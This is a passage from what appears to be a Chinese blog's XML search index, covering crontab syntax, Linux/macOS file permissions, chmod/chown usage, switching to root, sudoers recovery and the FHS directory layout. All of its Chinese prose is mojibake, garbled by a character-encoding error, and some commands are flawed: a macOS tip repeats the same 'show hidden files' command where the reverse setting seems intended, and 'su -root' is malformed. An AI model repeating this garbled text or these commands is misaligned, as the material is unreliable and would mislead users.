è¡¨ç¤ºä¸€ä¸ªæ•´æ•°èŒƒå›´ï¼Œä¾‹å¦‚â€œ2-6â€è¡¨ç¤ºâ€œ2,3,4,5,6â€</li><li>æ­£æ–œçº¿ï¼ˆ&#x2F;ï¼‰ï¼šå¯ä»¥ç”¨æ­£æ–œçº¿æŒ‡å®šæ—¶é—´çš„é—´éš”é¢‘ç‡ï¼Œä¾‹å¦‚â€œ0-23&#x2F;2â€è¡¨ç¤ºæ¯ä¸¤å°æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚</li><li>åŒæ—¶æ­£æ–œçº¿å¯ä»¥å’Œæ˜Ÿå·ä¸€èµ·ä½¿ç”¨ï¼Œä¾‹å¦‚*&#x2F;10ï¼Œå¦‚æœç”¨åœ¨minuteå­—æ®µï¼Œè¡¨ç¤ºæ¯ååˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚</li></ul><h2 id="crontabå‘½ä»¤"><a href="#crontabå‘½ä»¤" class="headerlink" title="crontabå‘½ä»¤"></a>crontabå‘½ä»¤</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u username] [file] [ -e | -l | -r]</span><br><span class="line">-u æŒ‡å®šè®¾ç½®æŸç”¨æˆ·crontab</span><br><span class="line">file å°†fileä½œä¸ºcrontabçš„ä»»åŠ¡åˆ—è¡¨æ–‡ä»¶</span><br><span class="line">-e ç¼–è¾‘æŸç”¨æˆ·crontab</span><br><span class="line">-l æ˜¾ç¤ºæŸç”¨æˆ·crontab</span><br><span class="line">-r åˆ é™¤æŸç”¨æˆ·crontab</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¸MACæ–‡ä»¶ã€ç›®å½•ä¸ç£ç›˜æ ¼å¼</title>
      <link href="/2021/09/23/Linux%E4%B8%8EMAC%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E4%B8%8E%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/"/>
      <url>/2021/09/23/Linux%E4%B8%8EMAC%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E4%B8%8E%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Linuxä¸MAC-OSæ–‡ä»¶ã€ç›®å½•å­¦ä¹ ç¬”è®°"><a href="#Linuxä¸MAC-OSæ–‡ä»¶ã€ç›®å½•å­¦ä¹ ç¬”è®°" class="headerlink" title="Linuxä¸MAC OSæ–‡ä»¶ã€ç›®å½•å­¦ä¹ ç¬”è®°"></a>Linuxä¸MAC OSæ–‡ä»¶ã€ç›®å½•å­¦ä¹ ç¬”è®°</h1><h2 id="0x01-æ–‡ä»¶æƒé™"><a href="#0x01-æ–‡ä»¶æƒé™" class="headerlink" title="0x01 æ–‡ä»¶æƒé™"></a>0x01 æ–‡ä»¶æƒé™</h2><h3 id="ç”¨æˆ·ä¸ç”¨æˆ·ç»„"><a href="#ç”¨æˆ·ä¸ç”¨æˆ·ç»„" class="headerlink" title="ç”¨æˆ·ä¸ç”¨æˆ·ç»„"></a>ç”¨æˆ·ä¸ç”¨æˆ·ç»„</h3><p>åœ¨Linuxæˆ–MACä¸‹å¤šä¸ªç”¨æˆ·å¯ä»¥å…±ç”¨ä¸€ä¸ªç³»ç»Ÿ&#x2F;ä¸€å°æœåŠ¡å™¨ï¼Œå› æ­¤ç³»ç»Ÿæ—¢è¦åŒ…å«å„ç”¨æˆ·<strong>å…±ç”¨æ–‡ä»¶</strong>åŠå„è‡ª<strong>ç§æœ‰æ–‡ä»¶</strong>ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æƒé™é…ç½®æ˜¾å¾—æå…¶é‡è¦ã€‚ä½†æ˜¯è‹¥ç”¨æˆ·é—´æ˜¯åˆä½œå›¢é˜Ÿå…³ç³»ï¼Œå¯ä»¥äº’ç›¸è®¿é—®å„è‡ªç§æœ‰æ–‡ä»¶ï¼Œè‹¥è¿˜æ˜¯é‡‡ç”¨åˆ†åˆ«å¯¹ç”¨æˆ·è¿›è¡Œæ–‡ä»¶è®¿é—®æˆæƒï¼Œæ˜¾å¾—æ•ˆç‡ä½ä¸‹ï¼Œå› æ­¤äº§ç”Ÿäº†ç”¨æˆ·ç»„ï¼Œä½¿å¾—ç»„å†…ç”¨æˆ·è·å¾—ä¸ç»„ç›¸åŒæƒé™ï¼Œç”¨æˆ·ç»„å®è´¨ä¸Šæ˜¯å…·æœ‰ç›¸åŒç‰¹å¾ç”¨æˆ·çš„é€»è¾‘é›†åˆã€‚</p><h4 id="rootç”¨æˆ·åŠå…¶ç”¨æˆ·ç»„"><a href="#rootç”¨æˆ·åŠå…¶ç”¨æˆ·ç»„" class="headerlink" title="rootç”¨æˆ·åŠå…¶ç”¨æˆ·ç»„"></a>rootç”¨æˆ·åŠå…¶ç”¨æˆ·ç»„</h4><p>Linuxä¸­ï¼Œå¯¹äºä»»ä½•ä¸€ä¸ªæ–‡ä»¶éƒ½æœ‰â€User,Group,Othersâ€3ç§èº«ä»½ï¼Œè€Œå¯¹äºæ–‡ä»¶æ¥è¯´rootç”¨æˆ·ä¾¿æ˜¯ä¸Useræ‹¥æœ‰ç­‰åŒæƒé™çš„ç‰¹æ®ŠOthersã€‚rootç”¨æˆ·ç»„ä¸æ™®é€šç”¨æˆ·ç»„ä¹Ÿä¸€æ ·å—æƒé™é™åˆ¶ï¼Œç»„å†…ç”¨æˆ·å¹¶æ²¡æœ‰ä¸rootç”¨æˆ·ç­‰åŒç”šè‡³æ›´é«˜æƒé™ã€‚</p><p>è€ŒMACä¸‹ç”±äºå¼•å…¥ç³»ç»Ÿå®Œæ•´æ€§ä¿æŠ¤ï¼ˆSIPï¼‰æœºåˆ¶ï¼Œè¿rootç”¨æˆ·éƒ½æ— æ³•åœ¨&#x2F;ã€&#x2F;usrç›®å½•ä¸‹æ–°å»ºæ–‡ä»¶</p><blockquote><p>SIPæœºåˆ¶ä¸€èˆ¬ä¸å»ºè®®å…³é—­ï¼Œåœ¨ä¸å…³é—­å‰æä¸‹ä»å¯ä»¥åˆ©ç”¨è½¯é“¾æ¥çš„æ–¹å¼åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºæ›¿èº«</p></blockquote><h3 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h3><p>æ“ä½œæ–‡ä»¶æ—¶ï¼Œè‹¥çœ‹è§<code>Permission deny</code>å­—æ ·ï¼Œä¸€èˆ¬æ˜¯æ–‡ä»¶æƒé™é…ç½®é—®é¢˜ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤é€šè¿‡æŸ¥çœ‹æ–‡ä»¶å±æ€§æ¥æŸ¥çœ‹æƒé™</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -al   # å¯ä»¥æŸ¥çœ‹è¯¥ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åŒ…æ‹¬éšè—æ–‡ä»¶(.å¼€å¤´)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å›æ˜¾</span></span><br><span class="line">-rw-r--r--    1   sloth  staff     12288      Nov 26 09:41 .bash_profile.swm</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[æ–‡ä»¶æƒé™] [è¿æ¥æ•°][æ‰€æœ‰è€…][ç”¨æˆ·ç»„] [æ–‡ä»¶å®¹é‡/B]  [åˆ›å»º/ä¿®æ”¹æ—¥æœŸ]      [æ–‡ä»¶å]</span></span><br></pre></td></tr></table></figure></div><p>è¡¨ç¤ºä¸ºæ–‡ä»¶æƒé™çš„å­—ç¬¦ä¸²ç”±10ä¸ªå­—ç¬¦ç»„æˆ</p><ul><li>ç¬¬ä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºæ–‡ä»¶ç±»å‹ï¼šd(ç›®å½•) -(æ–‡ä»¶) l(è¿æ¥æ–‡ä»¶) b(å¯ä¾›å­˜å‚¨æ¥å£è®¾å¤‡) c(ä¸²è¡Œç«¯å£è®¾å¤‡)</li><li>2-4ä¸‰ä¸ªå­—ç¬¦ä¸ºâ€rwxâ€çš„ç»„åˆè¡¨ç¤º<strong>æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™</strong>ï¼šr(å¯è¯») w(å¯å†™ä¸åŒ…æ‹¬åˆ é™¤) x(å¯æ‰§è¡Œ) (åˆ é™¤éœ€è¦è·å–çˆ¶ç›®å½•çš„wæƒé™)</li><li>5-7ä¸‰ä¸ªå­—ç¬¦ä¸ºâ€rwxâ€çš„ç»„åˆè¡¨ç¤º<strong>åŒç”¨æˆ·ç»„çš„æƒé™</strong></li><li>8-10ä¸‰ä¸ªå­—ç¬¦ä¸ºâ€rwxâ€çš„ç»„åˆè¡¨ç¤º<strong>å…¶ä»–éæœ¬ç”¨æˆ·ç»„çš„æƒé™</strong></li></ul><blockquote><p>æ–‡ä»¶åä»¥<code>.</code>å¼€å¤´çš„ç§°ä¸ºéšè—æ–‡ä»¶ï¼Œmacä¸‹æ˜¾ç¤ºéšè—æ–‡ä»¶å¿«æ·é”®:<code>command+shift+.</code> </p><p>âš ï¸macä¸‹åˆ›å»ºéšè—æ–‡ä»¶ä¼šæç¤º.å¼€å¤´æ–‡ä»¶ä»¥åŠè¢«ç³»ç»Ÿé¢„ç•™ï¼Œä¸èƒ½åˆ›å»º</p><p>è§£å†³æ–¹æ³•ï¼šç»ˆç«¯è¾“å…¥</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool YES</span><br><span class="line">killall Finder   </span><br></pre></td></tr></table></figure></div><p>åˆ›å»ºå®Œè¾“å…¥</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool YES</span><br><span class="line">killall Finder </span><br></pre></td></tr></table></figure></div></blockquote><h3 id="æ–‡ä»¶æƒé™åŠå±æ€§çš„ä¿®æ”¹"><a href="#æ–‡ä»¶æƒé™åŠå±æ€§çš„ä¿®æ”¹" class="headerlink" title="æ–‡ä»¶æƒé™åŠå±æ€§çš„ä¿®æ”¹"></a>æ–‡ä»¶æƒé™åŠå±æ€§çš„ä¿®æ”¹</h3><ul><li><p>chgrpï¼šæ”¹å˜æ–‡ä»¶æ‰€å±ç”¨æˆ·ç»„ </p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-R] dirname/filename        # -R:é€’å½’æ›´æ”¹ï¼Œæ”¹å˜å­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€ç›®å½•</span><br></pre></td></tr></table></figure></div></li><li><p>chownï¼šæ”¹å˜æ–‡ä»¶æ‰€æœ‰è€…</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown [-R] ç”¨æˆ·åç§°[:ç”¨æˆ·ç»„å] dirname/filename    # ç”¨æˆ·åä¸ç”¨æˆ·ç»„é—´è¿æ¥ä¹Ÿå¯ç”¨&#x27;.&#x27;ä½†åœ¨ç”¨æˆ·åä¸­å«&#x27;.&#x27;æ—¶ä¼šé€ æˆç³»ç»Ÿè¯¯åˆ¤ï¼Œå› æ­¤ä¸å»ºè®®</span><br></pre></td></tr></table></figure></div></li><li><p>chmodï¼šæ”¹å˜æ–‡ä»¶æƒé™</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod [-R] [u/g/o/a][+/-/=][r/w/x]/æƒé™åˆ†æ•° dirname/filename    # +ä¸-æ›´å¤šæ˜¯ä¿®æ”¹ï¼Œè€Œ=ç›¸å½“äºé‡ç½®(ä¼šæ¸…ç©ºåŸæ¥è®¾ç½®)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æƒé™åˆ†æ•°çš„è®¡ç®—</span></span><br><span class="line">-rw-r-xr--    </span><br><span class="line">[4+2+0][4+0+1][4+0+0]=654   # rwxè¡¨ç¤ºåˆ†æ•°åˆ†åˆ«ä¸º4 2 1</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯¹äºè®¾ç½®<code>4 2 1</code>çš„ç†è§£ï¼š421åˆ©äºè®¡ç®—æœºå­˜å‚¨ï¼Œ4â€“100 2â€“010 1â€“001 å¦‚æœè®¾ç½®æˆ<code>3 2 1</code>ç”±äºç³»ç»Ÿåªæ¥å—äº†å’Œï¼Œè€Œå½“ç³»ç»Ÿæ¥æ”¶åˆ°3æ—¶ï¼Œæ— æ³•åˆ¤æ–­æ˜¯èµ‹äºˆè¯»æƒé™è¿˜æ˜¯å†™+æ‰§è¡Œæƒé™ï¼Œä¼šé€ æˆæ­§ä¹‰</p><p>ğŸ’¡é™¤è¾“å…¥ä»¥ä¸Šå‘½ä»¤å¤–ï¼Œmacä¸‹æœ‰ä¸€ç§ç•¥å¾®ç®€ä¾¿çš„ä¿®æ”¹æ–‡ä»¶<strong>è¯»å†™</strong>æƒé™æ–¹å¼ï¼Œåœ¨<code>æ–‡ä»¶ç®€ä»‹</code>ä¸­å¯ä»¥ä¿®æ”¹userã€groupã€allçš„<u>è¯»å†™æƒé™</u>(ç›®å‰è¿˜æœªå‘ç°å¯ä»¥åŠ å…¥æ‰§è¡Œæƒé™çš„æ–‡ä»¶ç±»åˆ«),é€’å½’é€‰é¡¹éšè—åœ¨å·¦ä¸‹è§’</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24egy1h27plpvekkj20m609ewf6.jpg"                      alt="image-20220514101004553" style="zoom:50%;"                 ><figcaption>image-20220514101004553</figcaption></figure><p>ğŸ’¡macç»ˆç«¯ä½¿ç”¨å°æŠ€å·§ï¼šç›´æ¥å°†æ–‡ä»¶æ‹–å…¥ç»ˆç«¯ä¼šè½¬æ¢æˆç»å¯¹è·¯å¾„(ä¸å¸¦å¼•å·)</p></blockquote></li></ul><h4 id="ç»ˆç«¯åˆ‡æ¢rootç”¨æˆ·æƒé™"><a href="#ç»ˆç«¯åˆ‡æ¢rootç”¨æˆ·æƒé™" class="headerlink" title="ç»ˆç«¯åˆ‡æ¢rootç”¨æˆ·æƒé™"></a>ç»ˆç«¯åˆ‡æ¢rootç”¨æˆ·æƒé™</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su -root</span><br><span class="line">su -</span><br><span class="line">su</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä»¥ä¸Šä¸‰ç§è¦æ±‚è¾“å…¥rootç”¨æˆ·å¯†ç </span></span><br><span class="line">sudo su  # è¦æ±‚è¾“å…¥å½“å‰ç”¨æˆ·å¯†ç ï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·</span><br></pre></td></tr></table></figure></div><blockquote><p>sudoæ˜¯ä¸€ç§æƒé™ç®¡ç†æœºåˆ¶ï¼Œä¾èµ–äº&#x2F;etc&#x2F;sudoers âš ï¸âš ï¸macä¸Šä¸è¦è½»æ˜“ä¿®æ”¹sudoersæ–‡ä»¶æƒé™ï¼Œè¿™ä¼šå¯¼è‡´ç»ˆç«¯æ— æ³•åˆ‡æ¢rootç”¨æˆ·ï¼Œsudoå‘½ä»¤å¤±æ•ˆâš ï¸âš ï¸</p><p>è¡¥æ•‘æªæ–½ï¼š</p><ul><li>ç”µè„‘ä»èƒ½æ­£å¸¸å¼€æœºï¼š<code>ï£¿&gt;ç³»ç»Ÿåå¥½è®¾ç½®&gt;ç”¨æˆ·ä¸ç¾¤ç»„&gt;å·¦ä¸‹è§’å¼€é”ğŸ”“&gt;ç™»å½•é€‰é¡¹&gt;ç½‘ç»œè´¦æˆ·æœåŠ¡å™¨ï¼šåŠ å…¥&gt;æ‰“å¼€ç›®å½•å®ç”¨å·¥å…·&gt;èœå•æ çš„&#39;ç¼–è¾‘&#39;&gt;å¯ç”¨Rootç”¨æˆ·</code> ä»¥rootç”¨æˆ·ç™»å½•åä¾¿å¯åœ¨ç»ˆç«¯é‡æ–°æˆæƒï¼Œè¯¥æ–¹å¼å¯ä»¥è§£å†³å¤§å¤šæ•°<code>xxxx is owned by uid 501, should be 0</code>æŠ¥é”™</li><li>ç”µè„‘ä¸èƒ½æ­£å¸¸å¼€æœºï¼šé•¿æŒ‰ç”µæºé”®è¿›å…¥æ¢å¤æ¨¡å¼ï¼Œé‡Œé¢æœ‰ä¸ªç»ˆç«¯å¯ä»¥ä½¿ç”¨ï¼Œæˆ–è¿›å…¥å•ç”¨æˆ·æ¨¡å¼è¿›è¡Œä¿®æ”¹æƒé™æ“ä½œ</li></ul></blockquote><h2 id="0x02-ç›®å½•ç»“æ„"><a href="#0x02-ç›®å½•ç»“æ„" class="headerlink" title="0x02 ç›®å½•ç»“æ„"></a>0x02 ç›®å½•ç»“æ„</h2><h3 id="ç›®å½•é…ç½®â€“FHSæ ‡å‡†"><a href="#ç›®å½•é…ç½®â€“FHSæ ‡å‡†" class="headerlink" title="ç›®å½•é…ç½®â€“FHSæ ‡å‡†"></a>ç›®å½•é…ç½®â€“FHSæ ‡å‡†</h3><p>FHSä¾æ®æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨çš„é¢‘ç¹ä¸å¦ä»¥åŠæ˜¯å¦å…è®¸ç”¨æˆ·éšæ„æ”¹åŠ¨ï¼Œå°†ç›®å½•å®šä¹‰ä¸ºå››ç§äº¤äº’ä½œç”¨çš„å½¢æ€</p><table><thead><tr><th align="left">ç±»åˆ«</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td align="left">å¯åˆ†äº«çš„(shareable)</td><td>å¯åˆ†äº«ç»™å…¶ä»–ç³»ç»ŸæŒ‚è½½ä½¿ç”¨çš„ç›®å½•ï¼ŒåŒ…æ‹¬æ‰§è¡Œæ–‡ä»¶ä¸ç”¨æˆ·çš„é‚®ä»¶æ•°æ®ç­‰</td></tr><tr><td align="left">ä¸å¯åˆ†äº«çš„(unshareable)</td><td>ä¸æœºå™¨ç›¸å…³çš„è®¾å¤‡æ–‡ä»¶æˆ–ä¸ç¨‹åºç›¸å…³çš„socketæ–‡ä»¶ç­‰</td></tr><tr><td align="left">ä¸å˜çš„(static)</td><td>å†…å®¹ä¸ä¼šç»å¸¸å˜åŠ¨ï¼Œå‡½æ•°åº“ã€æ–‡ä»¶è¯´æ˜æ–‡ä»¶ã€ç³»ç»Ÿç®¡ç†å‘˜ç®¡ç†çš„é…ç½®æ–‡ä»¶ç­‰</td></tr><tr><td align="left">å¯å˜åŠ¨çš„(variable)</td><td>ç™»å½•æ–‡ä»¶ã€æ–°é—»ç»„</td></tr></tbody></table><h4 id="Linuxä¸‹æ ¹ç›®å½•çš„ä¸»è¦å­ç›®å½•"><a href="#Linuxä¸‹æ ¹ç›®å½•çš„ä¸»è¦å­ç›®å½•" class="headerlink" title="Linuxä¸‹æ ¹ç›®å½•çš„ä¸»è¦å­ç›®å½•"></a>Linuxä¸‹æ ¹ç›®å½•çš„ä¸»è¦å­ç›®å½•</h4><table><thead><tr><th>ç›®å½•</th><th>å†…å®¹</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>å­˜æ”¾åœ¨å•ç”¨æˆ·æ¨¡å¼ä¸‹ä»èƒ½æ‰§è¡Œçš„ç»ˆç«¯å‘½ä»¤ï¼šlsã€catç­‰ç­‰</td></tr><tr><td>&#x2F;boot</td><td>å­˜æ”¾å¼€æœºæ—¶ä½¿ç”¨åˆ°çš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬Linuxå†…æ ¸æ–‡ä»¶ã€å¼€æœºèœå•ã€å¼€æœºæ‰€éœ€é…ç½®æ–‡ä»¶ç­‰</td></tr><tr><td>&#x2F;dev</td><td>åœ¨linuxç³»ç»Ÿä¸Šä»»ä½•è®¾å¤‡ä¸æ¥å£è®¾å¤‡éƒ½ä»¥æ–‡ä»¶å½¢å¼å­˜åœ¨è¯¥ç›®å½•ä¸‹</td></tr><tr><td>&#x2F;etc</td><td>å­˜æ”¾ç³»ç»Ÿä¸»è¦çš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬äººå‘˜è´¦å·å¯†ç ã€å„ç§æœåŠ¡çš„èµ·å§‹æ–‡ä»¶(å¦‚mysqlçš„é…ç½®æ–‡ä»¶my.cnf)ç­‰   &#x2F;etc&#x2F;init.då­˜æ”¾æ‰€æœ‰æœåŠ¡çš„é»˜è®¤å¯åŠ¨è„šæœ¬</td></tr><tr><td>&#x2F;home</td><td>ç³»ç»Ÿé»˜è®¤ä¸»æ–‡ä»¶å¤¹ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬æ‰“å¼€ç»ˆç«¯å¸¸è§åˆ°çš„<code>~</code>   ä¸»æ–‡ä»¶å¤¹çš„å¦ä¸€ç§ä»£å·ï¼š<code>~dmtsai</code>ä»£è¡¨dmtsaiçš„ä¸»æ–‡ä»¶å¤¹</td></tr><tr><td>&#x2F;lib</td><td>å­˜æ”¾å¼€æœºæ—¶ä½¿ç”¨åˆ°çš„å‡½æ•°åº“ï¼Œä»¥åŠ&#x2F;binã€&#x2F;sbinä¸‹å‘½ä»¤è°ƒç”¨çš„å‡½æ•°åº“</td></tr><tr><td>&#x2F;media</td><td>æ”¾ç½®å¯åˆ é™¤çš„è®¾å¤‡ï¼Œå…‰ç›˜ã€è½¯ç›˜ã€DVDç­‰</td></tr><tr><td>&#x2F;mnt</td><td>å­˜æ”¾æš‚æ—¶æŒ‚è½½çš„æŸäº›é¢å¤–è®¾å¤‡</td></tr><tr><td>&#x2F;opt</td><td>å­˜æ”¾ç¬¬ä¸‰æ–¹è½¯ä»¶(å¦‚macä¸Šçš„è½¯ä»¶åŒ…ç¥å™¨homebrew)</td></tr><tr><td>&#x2F;root</td><td>rootç”¨æˆ·çš„ä¸»æ–‡ä»¶å¤¹,å•ç”¨æˆ·æ¨¡å¼ä¸‹è¯¥ç›®å½•æ‹¥æœ‰rootçš„ä¸»æ–‡ä»¶å¤¹</td></tr><tr><td>&#x2F;sbin</td><td>å¼€æœºã€ä¿®å¤ã€è¿˜åŸç³»ç»Ÿæ‰€éœ€å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤åªæœ‰rootæ‰èƒ½å¤Ÿåˆ©ç”¨æ¥â€œè®¾ç½®â€ç³»ç»Ÿï¼Œæ™®é€šç”¨æˆ·åªèƒ½ç”¨äºæŸ¥è¯¢</td></tr><tr><td>&#x2F;srv</td><td>srvâ€“service,å­˜æ”¾ç½‘ç»œæœåŠ¡æ‰€éœ€æ•°æ®ç›®å½•wwwç­‰ï¼Œä¸è¿‡éƒ¨åˆ†äº‘æœåŠ¡å™¨ä¹Ÿä¼šå°†wwwç›®å½•å•ç‹¬å‡ºæ¥æ”¾åœ¨æ ¹ç›®å½•ä¸‹</td></tr><tr><td>&#x2F;tmp</td><td>ç”¨äºä¸€èˆ¬ç”¨æˆ·æˆ–æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºæš‚æ—¶å­˜æ”¾æ–‡ä»¶ï¼Œä»»ä½•äººå¯è®¿é—®ï¼Œéœ€å®šæœŸæ¸…ç†ï¼ŒFHSç”šè‡³å»ºè®®å¼€æœºæ—¶å°†è¯¥ç›®å½•æ¸…ç©º</td></tr><tr><td>&#x2F;lost+found</td><td>ä½¿ç”¨æ ‡å‡†çš„ext2&#x2F;ext3æ–‡ä»¶ç³»ç»Ÿæ ¼å¼æ‰ä¼šäº§ç”Ÿçš„ç›®å½•ï¼Œå­˜æ”¾æ–‡ä»¶ç³»ç»Ÿå‘ç”Ÿé”™è¯¯æ—¶çš„ä¸¢å¤±ç‰‡æ®µ</td></tr><tr><td>&#x2F;proc</td><td>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œä¸å«ç¡¬ç›˜ç©ºé—´ï¼Œæ”¾ç½®çš„æ•°æ®éƒ½æ˜¯å†…å­˜å½“ä¸­çš„ï¼Œå¦‚ç³»ç»Ÿå†…æ ¸ã€è¿›ç¨‹ã€å¤–éƒ¨è®¾å¤‡çš„çŠ¶æ€åŠç½‘ç»œçŠ¶æ€</td></tr><tr><td>&#x2F;sys</td><td>ä¸&#x2F;procç±»ä¼¼ï¼Œè®°å½•å†…æ ¸ç›¸å…³ä¿¡æ¯</td></tr></tbody></table><blockquote><p>âš ï¸ä¸€å®šä¸èƒ½ä¸æ ¹ç›®å½•åˆ†å¼€çš„ç›®å½•ï¼š<code>/etc</code> <code>/bin</code> <code>/dev</code> <code>/lib</code> <code>/sbin</code></p></blockquote><h4 id="x2F-usrä¸-x2F-var"><a href="#x2F-usrä¸-x2F-var" class="headerlink" title="&#x2F;usrä¸&#x2F;var"></a>&#x2F;usrä¸&#x2F;var</h4><p>&#x2F;usrä¸‹ä¸»è¦ç›®å½• ï¼ˆæ³¨ï¼šusrâ€“UNIX Software Resource å¹¶ä¸æ˜¯userçš„ç¼©å†™ï¼‰</p><table><thead><tr><th>ç›®å½•</th><th>å†…å®¹</th></tr></thead><tbody><tr><td>&#x2F;usr&#x2F;bin</td><td>ç»å¤§éƒ¨åˆ†ç”¨æˆ·åœ¨ç»ˆç«¯å¯ä½¿ç”¨çš„å‘½ä»¤ï¼Œä¸&#x2F;binçš„ä¸åŒ(æ˜¯å¦ä¸å¼€æœºæœ‰å…³)</td></tr><tr><td>&#x2F;usr&#x2F;include</td><td>c&#x2F;c++ç­‰ç¨‹åºè¯­è¨€çš„å¤´æ–‡ä»¶ä¸åŒ…å«æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬ä»¥tarballæ–¹å¼(*.tar.gz)å®‰è£…æ•°æ®æ—¶ï¼Œæ—¶å¸¸ç”¨åˆ°é‡Œé¢çš„å¤´æ–‡ä»¶ï¼Œè£…æ¡†æ¶çš„æ—¶å€™ä¸è¦å¿˜è®°åŒ…å«å®ƒçš„includeç›®å½•(å¦‚macä¸‹ä½¿ç”¨Qt+Clionï¼Œå°±è¦å°†Qtçš„includeç›®å½•åŠ å…¥CMakeLists.txt)</td></tr><tr><td>&#x2F;usr&#x2F;X11R6</td><td>æ”¾ç½®X Windowç³»ç»Ÿé‡è¦æ•°æ®</td></tr><tr><td>&#x2F;usr&#x2F;lib</td><td>å„åº”ç”¨è½¯ä»¶çš„å‡½æ•°åº“ã€ç›®æ ‡æ–‡ä»¶ã€ä¸è¢«ä¸€èˆ¬ç”¨æˆ·æƒ¯ç”¨çš„æ‰§è¡Œæ–‡ä»¶ã€è„šæœ¬   X86_64çš„Linuxç³»ç»Ÿè¿˜æœ‰&#x2F;usr&#x2F;lib64</td></tr><tr><td>&#x2F;usr&#x2F;local</td><td>ç³»ç»Ÿç®¡ç†å‘˜åœ¨æœ¬æœºè‡ªè¡Œå®‰è£…ä¸‹è½½çš„è½¯ä»¶</td></tr><tr><td>&#x2F;usr&#x2F;sbin</td><td>éç³»ç»Ÿæ­£å¸¸è¿è¡Œæ‰€éœ€å‘½ä»¤</td></tr><tr><td>&#x2F;usr&#x2F;share</td><td>å…±äº«æ–‡ä»¶ï¼Œå‡ ä¹éƒ½æ˜¯æ–‡æœ¬æ–‡ä»¶</td></tr><tr><td>&#x2F;usr&#x2F;src</td><td>å»ºè®®æ”¾ç½®æºç  srcâ€“source  å†…æ ¸æºç å»ºè®®æ”¾åœ¨&#x2F;usr&#x2F;src&#x2F;linux</td></tr></tbody></table><p>&#x2F;varä¸‹ä¸»è¦ç›®å½•</p><table><thead><tr><th>ç›®å½•</th><th>å†…å®¹</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;cache</td><td>åº”ç”¨ç¨‹åºæœ¬èº«è¿è¡Œäº§ç”Ÿçš„æš‚å­˜æ–‡ä»¶</td></tr><tr><td>&#x2F;var&#x2F;lib</td><td>ç¨‹åºæ‰§è¡Œæ‰€éœ€æ•°æ®æ–‡ä»¶å­˜æ”¾çš„ç›®å½•</td></tr><tr><td>&#x2F;var&#x2F;lock</td><td>ä¸€æ¬¡åªèƒ½è¢«å•ä¸€ç¨‹åºä½¿ç”¨çš„æ–‡ä»¶èµ„æºæˆ–è®¾å¤‡</td></tr><tr><td>&#x2F;var&#x2F;log</td><td>ç™»å½•æ–‡ä»¶</td></tr><tr><td>&#x2F;var&#x2F;mail</td><td>ä¸ªäººç”µå­é‚®ä»¶ä¿¡ç®±</td></tr><tr><td>&#x2F;var&#x2F;run</td><td>ç¨‹åºæˆ–æœåŠ¡